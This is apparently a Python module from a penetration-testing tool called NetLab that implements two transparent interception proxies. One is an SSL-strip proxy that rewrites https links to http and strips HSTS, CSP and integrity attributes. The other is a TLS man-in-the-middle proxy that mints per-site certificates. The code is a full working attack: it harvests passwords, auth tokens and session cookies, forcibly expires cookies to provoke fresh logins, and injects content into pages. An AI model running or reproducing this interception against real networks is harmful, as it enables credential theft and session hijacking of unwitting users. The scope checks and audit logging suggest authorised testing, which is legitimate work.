"""The two transparent proxies that stand in the middle of a poisoned path.

`TransparentHttpProxy` receives traffic netfilter redirected from port 80.
It is NetLab's SSL strip: links and redirects to `https://` are rewritten to
`http://` on their way to the victim, the host is remembered, and the next
request for it is carried to the real server over TLS.  The victim's browser
therefore never negotiates TLS and never shows a warning -- and equally never
shows a padlock, which is the tell this attack has always had.

`TransparentTlsProxy` receives traffic redirected from port 443 and does the
honest version: it terminates TLS with a certificate minted for the requested
SNI by NetLab's own CA, reads the plaintext, and re-originates the connection
upstream.  Unless that CA has been installed on the device under test, the
victim sees a certificate warning.  That warning is not worked around.

Both funnel every exchange through the same processing: traffic-changer
rules, cookie killing, credential extraction and optional file carving.
"""

from __future__ import annotations

import gzip
import logging
import re
import socket
import socketserver
import ssl
import threading
import time
import zlib
from dataclasses import dataclass, field
from urllib.parse import urlsplit

from netlab.intercept.netcfg import original_destination

log = logging.getLogger("netlab.proxy")

MAX_HEAD = 65536
MAX_BODY = 8 * 1024 * 1024
SOCKET_TIMEOUT = 30.0
UPSTREAM_TIMEOUT = 20.0

REWRITABLE_TYPES = ("text/", "application/javascript", "application/json",
                    "application/xhtml", "application/xml", "text/xml",
                    "application/x-javascript", "application/ecmascript")

CARVE_TYPES = ("image/", "application/pdf", "application/zip",
               "application/octet-stream", "application/msword",
               "application/vnd.", "audio/", "video/", "text/csv")

HOP_BY_HOP = {"connection", "keep-alive", "proxy-authenticate",
              "proxy-connection", "te", "trailer", "transfer-encoding",
              "upgrade"}

# Anything that would let the victim's browser refuse the downgrade.
DROP_RESPONSE_HEADERS = {"strict-transport-security", "public-key-pins",
                         "public-key-pins-report-only",
                         "expect-ct", "content-security-policy",
                         "content-security-policy-report-only",
                         "x-content-security-policy", "alt-svc"}

_HTTPS_PATTERNS = (
    (re.compile(rb"https://", re.I), b"http://"),
    (re.compile(rb"https:\\/\\/", re.I), b"http:\\/\\/"),
    (re.compile(rb"https%3A%2F%2F", re.I), b"http%3A%2F%2F"),
    (re.compile(rb"https%3a%2f%2f"), b"http%3a%2f%2f"),
)
_HOST_RE = re.compile(rb"https://([A-Za-z0-9.\-]+)", re.I)
_INTEGRITY_RE = re.compile(rb"\s+integrity=(\"[^\"]*\"|'[^']*')", re.I)
_UPGRADE_RE = re.compile(
    rb"<meta[^>]+upgrade-insecure-requests[^>]*>", re.I)


# --------------------------------------------------------------- HTTP bytes

def read_until(sock, marker: bytes, limit: int) -> tuple[bytes, bytes]:
    """Read until `marker`; return (head_including_marker, leftover)."""
    buf = bytearray()
    while True:
        idx = buf.find(marker)
        if idx >= 0:
            end = idx + len(marker)
            return bytes(buf[:end]), bytes(buf[end:])
        if len(buf) > limit:
            return b"", bytes(buf)
        try:
            chunk = sock.recv(16384)
        except (OSError, ssl.SSLError):
            return b"", bytes(buf)
        if not chunk:
            return b"", bytes(buf)
        buf.extend(chunk)


def parse_head(head: bytes) -> tuple[str, list[tuple[str, str]]]:
    text = head.decode("latin-1")
    lines = text.split("\r\n")
    if not lines or not lines[0]:
        return "", []
    start = lines[0]
    headers = []
    for line in lines[1:]:
        if not line.strip():
            continue
        name, _, value = line.partition(":")
        if not _:
            continue
        headers.append((name.strip(), value.strip()))
    return start, headers


def header_get(headers, name: str, default: str = "") -> str:
    low = name.lower()
    for key, value in headers:
        if key.lower() == low:
            return value
    return default


def header_drop(headers, names) -> list[tuple[str, str]]:
    low = {n.lower() for n in names}
    return [(k, v) for k, v in headers if k.lower() not in low]


def header_set(headers, name: str, value: str) -> list[tuple[str, str]]:
    out = header_drop(headers, [name])
    out.append((name, value))
    return out


def build_head(start: str, headers) -> bytes:
    lines = [start] + ["%s: %s" % (k, v) for k, v in headers]
    return ("\r\n".join(lines) + "\r\n\r\n").encode("latin-1", "replace")


def read_body(sock, headers, leftover: bytes, is_response: bool,
              status: int = 0, method: str = "") -> tuple[bytes, bool]:
    """Read a complete body. Returns (body, complete)."""
    if is_response and (status in (204, 304) or 100 <= status < 200
                        or method.upper() == "HEAD"):
        return b"", True

    encoding = header_get(headers, "transfer-encoding").lower()
    length = header_get(headers, "content-length")

    if "chunked" in encoding:
        return _read_chunked(sock, leftover)
    if length:
        try:
            want = int(length)
        except ValueError:
            want = 0
        want = max(0, min(want, MAX_BODY))
        body = bytearray(leftover[:want])
        while len(body) < want:
            try:
                chunk = sock.recv(min(65536, want - len(body)))
            except (OSError, ssl.SSLError):
                return bytes(body), False
            if not chunk:
                return bytes(body), False
            body.extend(chunk)
        return bytes(body), True
    if not is_response:
        return b"", True
    # No framing header: the body runs to end of connection.
    body = bytearray(leftover)
    while len(body) < MAX_BODY:
        try:
            chunk = sock.recv(65536)
        except (OSError, ssl.SSLError):
            break
        if not chunk:
            break
        body.extend(chunk)
    return bytes(body), True


def _read_chunked(sock, leftover: bytes) -> tuple[bytes, bool]:
    buf = bytearray(leftover)
    out = bytearray()

    def fill() -> bool:
        try:
            chunk = sock.recv(65536)
        except (OSError, ssl.SSLError):
            return False
        if not chunk:
            return False
        buf.extend(chunk)
        return True

    while True:
        nl = buf.find(b"\r\n")
        while nl < 0:
            if not fill():
                return bytes(out), False
            nl = buf.find(b"\r\n")
        size_line = bytes(buf[:nl]).split(b";")[0].strip()
        del buf[:nl + 2]
        try:
            size = int(size_line, 16)
        except ValueError:
            return bytes(out), False
        if size == 0:
            return bytes(out), True
        if len(out) + size > MAX_BODY:
            return bytes(out), False
        while len(buf) < size + 2:
            if not fill():
                return bytes(out), False
        out.extend(buf[:size])
        del buf[:size + 2]


def decompress(body: bytes, encoding: str) -> tuple[bytes, bool]:
    """Undo Content-Encoding so the body can be read and rewritten."""
    enc = (encoding or "").lower().strip()
    try:
        if enc == "gzip":
            return gzip.decompress(body), True
        if enc in ("deflate", "zlib"):
            try:
                return zlib.decompress(body), True
            except zlib.error:
                return zlib.decompress(body, -zlib.MAX_WBITS), True
        if enc == "br":
            import brotli                       # optional dependency
            return brotli.decompress(body), True
        if enc == "zstd":
            import zstandard
            return zstandard.ZstdDecompressor().decompress(body), True
    except Exception:
        return body, False
    return body, not enc


# ------------------------------------------------------------ rules & state

@dataclass
class ChangerRule:
    """One find/replace applied to traffic in flight."""

    pattern: str = ""
    replacement: str = ""
    is_regex: bool = False
    direction: str = "response"        # request | response | both
    host: str = ""                     # empty = any host
    content_type: str = ""             # empty = any rewritable type
    enabled: bool = True
    mode: str = "replace"              # replace | inject
    anchor: str = "</body>"            # inject: place before this marker
    hits: int = 0
    _compiled: object = field(default=None, repr=False, compare=False)

    def compile(self):
        if self._compiled is None and self.pattern:
            if self.is_regex:
                self._compiled = re.compile(self.pattern.encode("utf-8"),
                                            re.I | re.S)
            else:
                self._compiled = self.pattern.encode("utf-8")
        return self._compiled

    def applies(self, direction: str, host: str, ctype: str) -> bool:
        if not self.enabled:
            return False
        if self.mode == "inject":
            if not self.replacement:
                return False
        elif not self.pattern:
            return False
        if self.direction not in ("both", direction):
            return False
        if self.host and self.host.lower() not in (host or "").lower():
            return False
        if self.content_type and self.content_type.lower() not in (ctype or "").lower():
            return False
        return True

    def apply(self, data: bytes) -> tuple[bytes, int]:
        if self.mode == "inject":
            return self._inject(data)
        target = self.compile()
        if target is None:
            return data, 0
        repl = self.replacement.encode("utf-8")
        if self.is_regex:
            out, count = target.subn(repl, data)
        else:
            count = data.count(target)
            out = data.replace(target, repl) if count else data
        if count:
            self.hits += count
        return out, count

    def _inject(self, data: bytes) -> tuple[bytes, int]:
        """Insert `replacement` before the last `anchor`, or append it if the
        anchor is absent. One injection per response body."""
        snippet = self.replacement.encode("utf-8")
        if not snippet:
            return data, 0
        anchor = (self.anchor or "</body>").encode("utf-8")
        idx = data.lower().rfind(anchor.lower())
        out = data + snippet if idx < 0 else data[:idx] + snippet + data[idx:]
        self.hits += 1
        return out, 1

    def to_dict(self) -> dict:
        return {"pattern": self.pattern, "replacement": self.replacement,
                "is_regex": self.is_regex, "direction": self.direction,
                "host": self.host, "content_type": self.content_type,
                "mode": self.mode, "anchor": self.anchor,
                "enabled": self.enabled, "hits": self.hits}

    @classmethod
    def from_dict(cls, d: dict) -> "ChangerRule":
        known = {"pattern", "replacement", "is_regex", "direction", "host",
                 "content_type", "mode", "anchor", "enabled"}
        return cls(**{k: v for k, v in (d or {}).items() if k in known})


@dataclass
class ProxyStats:
    connections: int = 0
    requests: int = 0
    bytes_in: int = 0
    bytes_out: int = 0
    stripped_links: int = 0
    stripped_hosts: int = 0
    cookies_killed: int = 0
    rules_applied: int = 0
    files_carved: int = 0
    credentials: int = 0
    errors: int = 0
    upstream_failures: int = 0

    def as_dict(self) -> dict:
        return dict(self.__dict__)


class InterceptContext:
    """Everything the two proxies share: rules, state and callbacks."""

    def __init__(self, scope=None, audit=None, on_event=None,
                 on_credential=None, on_exchange=None, on_file=None,
                 ca=None) -> None:
        self.scope = scope
        self.audit = audit
        self.on_event = on_event
        self.on_credential = on_credential
        self.on_exchange = on_exchange
        self.on_file = on_file
        self.ca = ca

        self.sslstrip = True
        self.cookie_killer = False
        self.carve_files = False
        self.verify_upstream = False
        self.rules: list[ChangerRule] = []
        self.stats = ProxyStats()

        self._lock = threading.Lock()
        self._stripped_hosts: set[str] = set()
        self._killed_cookies: set[str] = set()
        self.local_addresses: set[str] = set()
        self.listen_ports: set[int] = set()

    def listen_endpoints(self) -> set[tuple[str, int]]:
        """Every address:port this process is itself listening on."""
        return {(addr, port) for addr in self.local_addresses | {"0.0.0.0"}
                for port in self.listen_ports}

    # --------------------------------------------------------------- state

    def mark_stripped(self, host: str) -> None:
        host = (host or "").lower()
        if not host:
            return
        with self._lock:
            if host not in self._stripped_hosts:
                self._stripped_hosts.add(host)
                self.stats.stripped_hosts += 1
                self.emit("strip.host", {"host": host})

    def is_stripped(self, host: str) -> bool:
        with self._lock:
            return (host or "").lower() in self._stripped_hosts

    def stripped_hosts(self) -> list[str]:
        with self._lock:
            return sorted(self._stripped_hosts)

    def should_kill_cookies(self, client: str, host: str) -> bool:
        if not self.cookie_killer:
            return False
        key = "%s|%s" % (client, (host or "").lower())
        with self._lock:
            if key in self._killed_cookies:
                return False
            self._killed_cookies.add(key)
            self.stats.cookies_killed += 1
        return True

    def reset_state(self) -> None:
        with self._lock:
            self._stripped_hosts.clear()
            self._killed_cookies.clear()

    def set_rules(self, rules) -> None:
        compiled = []
        for rule in rules:
            r = rule if isinstance(rule, ChangerRule) else ChangerRule.from_dict(rule)
            try:
                r.compile()
            except re.error as exc:
                self.emit("rule.error", {"pattern": r.pattern, "error": str(exc)})
                continue
            compiled.append(r)
        with self._lock:
            self.rules = compiled

    def active_rules(self) -> list[ChangerRule]:
        with self._lock:
            return list(self.rules)

    # ------------------------------------------------------------ callbacks

    def emit(self, name: str, data: dict) -> None:
        if self.on_event:
            try:
                self.on_event(name, data)
            except Exception:                    # pragma: no cover
                pass

    def credential(self, cred: dict) -> None:
        self.stats.credentials += 1
        if self.audit:
            self.audit.record("credential", proto=cred.get("proto"),
                              user=cred.get("user"), server=cred.get("server"),
                              source=cred.get("source"))
        if self.on_credential:
            try:
                self.on_credential(cred)
            except Exception:                    # pragma: no cover
                pass

    def allowed(self, client_ip: str) -> bool:
        """Only clients inside the engagement are proxied."""
        if self.scope is None:
            return True
        return self.scope.contains(client_ip)

    def apply_rules(self, data: bytes, direction: str, host: str,
                    ctype: str) -> bytes:
        for rule in self.active_rules():
            if not rule.applies(direction, host, ctype):
                continue
            data, count = rule.apply(data)
            if count:
                self.stats.rules_applied += count
                self.emit("changer.hit", {"pattern": rule.pattern,
                                          "host": host, "count": count})
                if self.audit:
                    self.audit.record("changer.hit", pattern=rule.pattern,
                                      host=host, count=count)
        return data


# ------------------------------------------------------------------ stripping

def strip_body(body: bytes, ctx: InterceptContext) -> tuple[bytes, int]:
    """Rewrite https links to http and remove what would break the downgrade."""
    hosts = set(m.group(1).decode("latin-1", "replace").lower()
                for m in _HOST_RE.finditer(body))
    total = 0
    for pattern, replacement in _HTTPS_PATTERNS:
        body, count = pattern.subn(replacement, body)
        total += count
    if total:
        body = _INTEGRITY_RE.sub(b"", body)      # SRI would reject the rewrite
        body = _UPGRADE_RE.sub(b"", body)
        for host in hosts:
            ctx.mark_stripped(host)
    return body, total


def strip_response_headers(headers, ctx: InterceptContext) -> list[tuple[str, str]]:
    out = []
    for key, value in headers:
        low = key.lower()
        if low in DROP_RESPONSE_HEADERS:
            continue
        if low == "location" and value.lower().startswith("https://"):
            host = urlsplit(value).hostname or ""
            ctx.mark_stripped(host)
            ctx.stats.stripped_links += 1
            value = "http://" + value[len("https://"):]
        elif low == "set-cookie":
            value = re.sub(r";\s*Secure\b", "", value, flags=re.I)
            value = re.sub(r";\s*SameSite\s*=\s*None\b", "; SameSite=Lax",
                           value, flags=re.I)
        out.append((key, value))
    return out


def expire_cookies(cookie_header: str, host: str) -> list[str]:
    """Set-Cookie lines that delete every cookie the victim just presented."""
    lines = []
    seen = set()
    for part in (cookie_header or "").split(";"):
        name = part.split("=", 1)[0].strip()
        if not name or name in seen:
            continue
        seen.add(name)
        for domain in ("", "; Domain=%s" % host,
                       "; Domain=.%s" % host.split(".", 1)[-1] if "." in host else ""):
            lines.append("%s=; Expires=Thu, 01 Jan 1970 00:00:00 GMT; "
                         "Max-Age=0; Path=/%s" % (name, domain))
    return lines[:48]


# -------------------------------------------------------------- the exchange

class Exchange:
    """One request/response pair, processed and relayed."""

    def __init__(self, ctx: InterceptContext, client_sock, client_addr,
                 dest_host: str, dest_port: int, tls_upstream: bool,
                 sni: str = "", source: str = "sslstrip") -> None:
        self.ctx = ctx
        self.client = client_sock
        self.client_ip = client_addr[0]
        self.dest_host = dest_host
        self.dest_port = dest_port
        self.tls_upstream = tls_upstream
        self.sni = sni
        self.source = source

    # ---------------------------------------------------------------- run

    def run(self) -> None:
        ctx = self.ctx
        head, leftover = read_until(self.client, b"\r\n\r\n", MAX_HEAD)
        if not head:
            return
        start, headers = parse_head(head)
        if not start:
            return
        parts = start.split(None, 2)
        if len(parts) < 2:
            return
        method, target = parts[0], parts[1]
        version = parts[2] if len(parts) > 2 else "HTTP/1.1"

        host_header = header_get(headers, "host") or self.sni or self.dest_host
        host = host_header.split(":")[0]
        if not self.dest_host:
            # No netfilter redirect behind this connection, so the Host
            # header is the only statement of where it was meant to go.
            self.dest_host = host
            if ":" in host_header:
                try:
                    self.dest_port = int(host_header.rsplit(":", 1)[1])
                except ValueError:
                    pass
        scheme = "https" if self.source == "ssl-mitm" else "http"
        url = "%s://%s%s" % (scheme, host_header, target)
        ctx.stats.requests += 1

        body, _complete = read_body(self.client, headers, leftover,
                                    is_response=False, method=method)
        ctx.stats.bytes_in += len(head) + len(body)

        self._harvest(method, url, host, headers, body)

        if ctx.should_kill_cookies(self.client_ip, host) and \
                header_get(headers, "cookie"):
            self._kill_cookies(header_get(headers, "cookie"), host, url,
                               version)
            return

        req_headers = self._prepare_request(headers, host)
        ctype = header_get(headers, "content-type")
        if body:
            body = ctx.apply_rules(body, "request", host, ctype)
            req_headers = header_set(req_headers, "Content-Length",
                                     str(len(body)))
        request = build_head("%s %s %s" % (method, target, version),
                             req_headers) + body

        upstream = self._connect_upstream(host)
        if upstream is None:
            self._error(502, "NetLab could not reach %s" % host)
            return
        try:
            upstream.sendall(request)
            ctx.stats.bytes_out += len(request)
            self._relay_response(upstream, method, host, url)
        except (OSError, ssl.SSLError) as exc:
            ctx.stats.errors += 1
            log.debug("upstream relay failed for %s: %s", url, exc)
        finally:
            try:
                upstream.close()
            except OSError:
                pass

    # ------------------------------------------------------------ upstream

    def _connect_upstream(self, host: str):
        ctx = self.ctx
        use_tls = self.tls_upstream or ctx.is_stripped(host)
        port = self.dest_port
        if use_tls and port == 80:
            port = 443
        target_host = self.dest_host or host
        if target_host in ctx.local_addresses and host:
            target_host = host
        # Second guard against relaying into ourselves: a redirect rule or a
        # spoofed DNS answer that points at this machine would otherwise turn
        # the proxy into its own client.
        if (target_host, port) in ctx.listen_endpoints():
            ctx.stats.upstream_failures += 1
            ctx.emit("proxy.loop-blocked", {"host": target_host, "port": port})
            return None
        try:
            sock = socket.create_connection((target_host, port),
                                            timeout=UPSTREAM_TIMEOUT)
        except OSError as exc:
            ctx.stats.upstream_failures += 1
            log.debug("connect %s:%d failed: %s", target_host, port, exc)
            return None
        sock.settimeout(UPSTREAM_TIMEOUT)
        if not use_tls:
            return sock
        context = ssl.create_default_context()
        if not ctx.verify_upstream:
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
        try:
            return context.wrap_socket(sock, server_hostname=host or None)
        except (ssl.SSLError, OSError) as exc:
            ctx.stats.upstream_failures += 1
            log.debug("upstream TLS to %s failed: %s", host, exc)
            try:
                sock.close()
            except OSError:
                pass
            return None

    def _prepare_request(self, headers, host: str):
        """Make the request one we can read the answer to."""
        out = header_drop(headers, HOP_BY_HOP | {"accept-encoding",
                                                 "if-modified-since",
                                                 "if-none-match",
                                                 "upgrade-insecure-requests"})
        # identity encoding: the body has to be readable to be rewritten, and
        # a 304 would carry no body at all.
        out = header_set(out, "Accept-Encoding", "identity")
        out = header_set(out, "Connection", "close")
        referer = header_get(headers, "referer")
        if referer.lower().startswith("https://") and self.source == "sslstrip":
            out = header_set(out, "Referer", "https://" + referer[8:])
        return out

    # ------------------------------------------------------------ response

    def _relay_response(self, upstream, method: str, host: str,
                        url: str) -> None:
        ctx = self.ctx
        head, leftover = read_until(upstream, b"\r\n\r\n", MAX_HEAD)
        if not head:
            ctx.stats.errors += 1
            return
        start, headers = parse_head(head)
        status = 0
        parts = start.split(None, 2)
        if len(parts) >= 2 and parts[1].isdigit():
            status = int(parts[1])

        body, _complete = read_body(upstream, headers, leftover,
                                    is_response=True, status=status,
                                    method=method)
        encoding = header_get(headers, "content-encoding")
        ctype = header_get(headers, "content-type")
        body, decoded = decompress(body, encoding)

        if ctx.sslstrip and self.source == "sslstrip":
            headers = strip_response_headers(headers, ctx)
        headers = header_drop(headers, HOP_BY_HOP | {"content-encoding"})

        rewritable = decoded and any(t in ctype.lower()
                                     for t in REWRITABLE_TYPES)
        if rewritable:
            if ctx.sslstrip and self.source == "sslstrip":
                body, count = strip_body(body, ctx)
                if count:
                    ctx.stats.stripped_links += count
                    ctx.emit("strip.body", {"url": url, "links": count})
            body = ctx.apply_rules(body, "response", host, ctype)
        elif ctx.carve_files and body and ctx.on_file and \
                any(t in ctype.lower() for t in CARVE_TYPES):
            try:
                ctx.on_file({"url": url, "content_type": ctype,
                             "data": body, "client": self.client_ip,
                             "host": host, "source": self.source})
                ctx.stats.files_carved += 1
            except Exception:                    # pragma: no cover
                pass

        headers = header_set(headers, "Content-Length", str(len(body)))
        headers = header_set(headers, "Connection", "close")
        payload = build_head(start, headers) + body
        try:
            self.client.sendall(payload)
        except (OSError, ssl.SSLError):
            ctx.stats.errors += 1
            return
        ctx.stats.bytes_in += len(payload)
        if ctx.on_exchange:
            try:
                ctx.on_exchange({"url": url, "status": status,
                                 "method": method, "host": host,
                                 "content_type": ctype, "bytes": len(body),
                                 "client": self.client_ip,
                                 "source": self.source})
            except Exception:                    # pragma: no cover
                pass

    # --------------------------------------------------------------- extras

    def _harvest(self, method: str, url: str, host: str, headers,
                 body: bytes) -> None:
        """Credentials out of a request we can read in full."""
        from netlab.analyze import credfmt as fmt

        ctx = self.ctx
        hdict = {k.lower(): v for k, v in headers}

        auth = hdict.get("authorization") or hdict.get("proxy-authorization")
        if auth:
            parsed = fmt.parse_http_authorization(auth)
            if parsed and (parsed.get("password") or parsed.get("hash")
                           or parsed.get("token")):
                ctx.credential({
                    "proto": "HTTP", "client": self.client_ip,
                    "server": self.dest_host, "port": self.dest_port,
                    "user": parsed.get("user", ""),
                    "password": parsed.get("password", ""),
                    "hash": parsed.get("hash", ""),
                    "hash_type": parsed.get("hash_type", ""),
                    "hashcat_mode": parsed.get("hashcat_mode", 0),
                    "context": "%s auth  %s" % (parsed.get("scheme", "?"), url),
                    "source": self.source,
                    "extra": {"url": url, "host": host,
                              "token": parsed.get("token", "")}})

        if body and method.upper() in ("POST", "PUT", "PATCH"):
            form = fmt.parse_form_credentials(body, hdict.get("content-type", ""))
            if form and (form.get("password") or form.get("user")):
                ctx.credential({
                    "proto": "HTTP", "client": self.client_ip,
                    "server": self.dest_host, "port": self.dest_port,
                    "user": form.get("user", ""),
                    "password": form.get("password", ""),
                    "context": "form %s  %s" % (method.upper(), url),
                    "source": self.source,
                    "extra": {"url": url, "host": host,
                              "fields": form.get("fields", {})}})

        cookie = hdict.get("cookie")
        if cookie and len(cookie) > 12:
            ctx.credential({
                "proto": "HTTP", "client": self.client_ip,
                "server": self.dest_host, "port": self.dest_port,
                "user": "", "context": "session cookie  %s" % host,
                "source": self.source,
                "extra": {"url": url, "host": host,
                          "token": cookie[:512], "cookie": cookie[:512]}})

    def _kill_cookies(self, cookie_header: str, host: str, url: str,
                      version: str) -> None:
        """Expire the victim's cookies so the next page forces a fresh login."""
        headers = [("Location", url), ("Content-Length", "0"),
                   ("Cache-Control", "no-store"), ("Connection", "close")]
        for line in expire_cookies(cookie_header, host):
            headers.append(("Set-Cookie", line))
        payload = build_head("%s 302 Found" % version, headers)
        try:
            self.client.sendall(payload)
        except (OSError, ssl.SSLError):
            return
        self.ctx.emit("cookie.killed", {"client": self.client_ip,
                                        "host": host, "url": url})
        if self.ctx.audit:
            self.ctx.audit.record("cookie.kill", client=self.client_ip,
                                  host=host, url=url)

    def _error(self, status: int, message: str) -> None:
        body = message.encode("utf-8")
        payload = build_head("HTTP/1.1 %d NetLab" % status,
                             [("Content-Type", "text/plain; charset=utf-8"),
                              ("Content-Length", str(len(body))),
                              ("Connection", "close")]) + body
        try:
            self.client.sendall(payload)
        except (OSError, ssl.SSLError):
            pass


# ----------------------------------------------------------------- servers

class _ThreadedServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True
    request_queue_size = 128

    def handle_error(self, request, client_address):
        log.debug("proxy handler error from %s", client_address, exc_info=True)


class _BaseProxy:
    """Common lifecycle for the two transparent proxies."""

    name = "proxy"

    def __init__(self, ctx: InterceptContext, port: int = 0) -> None:
        self.ctx = ctx
        self.port = int(port)
        self._server: _ThreadedServer | None = None
        self._thread: threading.Thread | None = None

    def _handler_class(self):                    # pragma: no cover - abstract
        raise NotImplementedError

    def start(self) -> int:
        if self._server is not None:
            return self.port
        self._server = _ThreadedServer(("0.0.0.0", self.port),
                                       self._handler_class())
        self.port = self._server.server_address[1]
        self.ctx.listen_ports.add(self.port)
        self._thread = threading.Thread(target=self._server.serve_forever,
                                        kwargs={"poll_interval": 0.3},
                                        name=self.name, daemon=True)
        self._thread.start()
        if self.ctx.audit:
            self.ctx.audit.record("%s.start" % self.name, port=self.port)
        return self.port

    def stop(self) -> None:
        server, self._server = self._server, None
        self.ctx.listen_ports.discard(self.port)
        if server is not None:
            server.shutdown()
            server.server_close()
        if self._thread:
            self._thread.join(timeout=3.0)
            self._thread = None
        if self.ctx.audit:
            self.ctx.audit.record("%s.stop" % self.name,
                                  **self.ctx.stats.as_dict())

    @property
    def running(self) -> bool:
        return self._server is not None


class TransparentHttpProxy(_BaseProxy):
    """SSL strip: takes redirected port 80 traffic, speaks TLS upstream."""

    name = "sslstrip"

    def _handler_class(self):
        ctx = self.ctx

        class Handler(socketserver.BaseRequestHandler):
            def handle(self) -> None:
                sock = self.request
                sock.settimeout(SOCKET_TIMEOUT)
                ctx.stats.connections += 1
                client_ip = self.client_address[0]
                if not ctx.allowed(client_ip):
                    ctx.emit("proxy.out-of-scope", {"client": client_ip})
                    return
                # Redirected traffic says where it was going; a direct
                # connection to this port does not, so the Host header is
                # used instead and the proxy works as an explicit one too.
                dest = original_destination(sock) or ("", 80)
                Exchange(ctx, sock, self.client_address, dest[0], dest[1],
                         tls_upstream=False, source="sslstrip").run()

        return Handler


class TransparentTlsProxy(_BaseProxy):
    """SSL MITM: terminates TLS with a NetLab-minted certificate per SNI."""

    name = "ssl-mitm"

    def _handler_class(self):
        ctx = self.ctx

        class Handler(socketserver.BaseRequestHandler):
            def handle(self) -> None:
                raw = self.request
                raw.settimeout(SOCKET_TIMEOUT)
                ctx.stats.connections += 1
                client_ip = self.client_address[0]
                if not ctx.allowed(client_ip):
                    ctx.emit("proxy.out-of-scope", {"client": client_ip})
                    return
                if ctx.ca is None:
                    return
                # Without a redirect there is no original destination; the
                # SNI the client sends names both the certificate to mint and
                # the server to relay to.
                dest = original_destination(raw) or ("", 443)
                seen = {"sni": ""}

                def pick_certificate(sslsock, server_name, _ctx):
                    """Swap in a certificate for whatever name was asked for."""
                    name = server_name or dest[0]
                    seen["sni"] = name
                    try:
                        sslsock.context = ctx.ca.context_for(name)
                    except Exception:            # pragma: no cover
                        log.debug("cannot mint certificate for %s", name,
                                  exc_info=True)

                try:
                    base = ctx.ca.context_for(dest[0])
                    base.sni_callback = pick_certificate
                    tls = base.wrap_socket(raw, server_side=True)
                except (ssl.SSLError, OSError) as exc:
                    # A client that refuses our certificate lands here; that
                    # is the warning working, and it is recorded, not hidden.
                    ctx.emit("tls.rejected", {"client": client_ip,
                                              "server": dest[0],
                                              "reason": str(exc)[:160]})
                    return
                try:
                    tls.settimeout(SOCKET_TIMEOUT)
                    Exchange(ctx, tls, self.client_address, dest[0], dest[1],
                             tls_upstream=True, sni=seen["sni"],
                             source="ssl-mitm").run()
                finally:
                    try:
                        tls.close()
                    except OSError:
                        pass

        return Handler
